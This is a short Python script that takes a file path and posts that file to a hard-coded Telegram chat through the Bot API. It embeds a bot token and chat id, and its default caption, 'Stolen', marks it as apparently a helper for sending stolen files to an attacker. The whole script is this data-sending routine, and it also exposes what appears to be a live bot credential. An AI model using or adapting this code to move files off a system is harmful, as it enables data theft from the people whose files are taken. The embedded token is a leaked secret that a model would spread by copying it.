# credit : https://github.com/lshaf
import os
import argparse
import requests
from os import path

token = "7264676044:AAG9DfMiem-r6LE61Fif8s3wvfZdBfZRJ9c"
tg_id = "6044695425"

# Initialize parser
parser = argparse.ArgumentParser()
parser.add_argument("-f", "--file", required=True, help = "File to upload")
parser.add_argument("-c", "--caption", help = "Text to add")
args = parser.parse_args()

if not path.isfile(args.file):
    parser.error("-f/--file: File not exist")

caption = args.caption
if caption is None or caption == "":
    caption = "Stolen"

url = f"https://api.telegram.org/bot{token}/sendDocument"
files = {"document": open(args.file, "rb")}
data = {
    "chat_id": tg_id,
    "caption": caption,
}
requests.post(url, files=files, data=data)
